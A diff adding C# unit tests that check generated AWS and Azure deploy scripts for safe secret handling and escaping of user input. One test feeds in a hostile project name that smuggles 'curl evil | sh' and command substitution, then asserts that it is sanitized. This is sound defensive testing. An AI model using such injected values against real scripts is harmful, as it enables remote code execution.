@@ -85,7 +85,79 @@ public sealed class CloudBundleTests : IDisposable
 
         written.Should().Contain("deploy-azure.sh").And.NotContain("deploy-aws.sh");
         var deploy = File.ReadAllText(Path.Combine(bundle, "deploy-azure.sh"));
-        deploy.Should().Contain("az acr build").And.Contain("az container create").And.Contain("--restart-policy Never");
+        deploy.Should().Contain("az acr build").And.Contain("az container create").And.Contain("restartPolicy: Never");
+    }
+
+    [Fact]
+    public async Task Deploy_scripts_keep_secrets_and_requests_out_of_harms_way()
+    {
+        // The two findings the in-flight review flagged, pinned: the ACR admin password must never
+        // ride a command line (process listings are world-readable), and an operator request must
+        // be escaped before it is spliced into the task-definition JSON / deployment YAML.
+        Scaffold();
+        await Certify();
+
+        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-sec-aws"), NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws);
+        var aws = File.ReadAllText(Path.Combine(_dir, "out-sec-aws", "deploy-aws.sh"));
+        aws.Should().Contain("CMD=\"[\\\"$(json_escape \"$REQUEST\")\\\"]\"",
+            "the request must pass through json_escape at the exact splice into the task definition");
+        aws.Should().NotContain("[\\\"$REQUEST\\\"]", "raw interpolation of the request into JSON is an injection");
+        aws.Should().NotContain("sleep 10", "IAM propagation is a retry that surfaces the real error, not a blind sleep");
+        aws.Should().NotContain("\r", "a CRLF deploy script is unrunnable under POSIX sh, whatever platform built the CLI");
+
+        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-sec-az"), NativeBundle.Describe(_dir, "azure"), CloudTarget.Azure);
+        var az = File.ReadAllText(Path.Combine(_dir, "out-sec-az", "deploy-azure.sh"));
+        az.Should().NotContain("--registry-password", "the ACR password must never appear on a command line");
+        az.Should().NotContain("--command-line", "the request rides as an exec-style array, never through a shell-parsed string");
+        az.Should().Contain("command: [\\\"/work/entrypoint.sh\\\", \\\"$(yaml_escape \"$REQUEST\")\\\"]",
+            "the request must pass through yaml_escape at the exact splice into the deployment spec");
+        az.Should().Contain("PASSWORD_ESC=$(yaml_escape \"$PASSWORD\")",
+            "credential escaping must be a standalone assignment — inside the heredoc its refusal would fail open");
+        az.Should().Contain("chmod 600", "the deployment spec carrying the password is operator-readable only");
+        az.Should().Contain("trap 'rm -f \"$SPEC\"' EXIT", "the spec holding the password must not outlive the run");
+        az.Should().NotContain("\r", "a CRLF deploy script is unrunnable under POSIX sh, whatever platform built the CLI");
+    }
+
+    [Fact]
+    public async Task A_hostile_or_awkward_project_name_never_reaches_the_scripts_raw()
+    {
+        // CloudBundle.Safe is the only barrier between a manifest's metadata.name and a shell
+        // script the operator executes — and between that name and ECR/ACR/ACI naming rules.
+        Scaffold();
+        await Certify();
+        var info = NativeBundle.Describe(_dir, "aws");
+
+        var hostile = info with { Name = "demo\"; curl evil | sh; $(id) `x`" };
+        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-hostile"), hostile, CloudTarget.Aws);
+        var deploy = File.ReadAllText(Path.Combine(_dir, "out-hostile", "deploy-aws.sh"));
+        var nameLine = deploy.Split('\n').First(l => l.StartsWith("NAME=", StringComparison.Ordinal));
+        nameLine.Should().MatchRegex("^NAME=\"[a-z0-9-]+\"$", "a manifest name must never smuggle shell into the deploy script");
+
+        var awkward = info with { Name = "-Q-" };
+        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-awkward"), awkward, CloudTarget.Azure);
+        File.ReadAllText(Path.Combine(_dir, "out-awkward", "deploy-azure.sh"))
+            .Should().Contain("NAME=\"app\"", "a name too thin to satisfy cloud naming rules falls back rather than failing every command");
+
+        var lengthy = info with { Name = new string('x', 80) + "-tail" };
+        CloudBundle.Stage(_dir, Path.Combine(_dir, "out-long"), lengthy, CloudTarget.Aws);
+        var longLine = File.ReadAllText(Path.Combine(_dir, "out-long", "deploy-aws.sh"))
+            .Split('\n').First(l => l.StartsWith("NAME=", StringComparison.Ordinal));
+        longLine.Length.Should().BeLessThanOrEqualTo("NAME=\"\"".Length + 32, "derived cloud names must clear ACR/ACI/IAM length limits");
+    }
+
+    [Fact]
+    public async Task The_runtime_image_can_be_pinned_and_is_recorded_honestly()
+    {
+        Scaffold();
+        await Certify();
+        var bundle = Path.Combine(_dir, "out-pinned");
+        var pinned = "ghcr.io/ianfrelinger/nexo-cli@sha256:1111111111111111111111111111111111111111111111111111111111111111";
+
+        CloudBundle.Stage(_dir, bundle, NativeBundle.Describe(_dir, "aws"), CloudTarget.Aws, runtimeImage: pinned);
+
+        File.ReadAllText(Path.Combine(bundle, "Dockerfile")).Should().StartWith($"FROM {pinned}");
+        var d = JsonSerializer.Deserialize<JsonElement>(File.ReadAllText(Path.Combine(bundle, "bundle.json")));
+        d.GetProperty("runtimeImage").GetString().Should().Be(pinned, "the descriptor must record the verifier that will actually run the app");
     }
 
     [Fact]
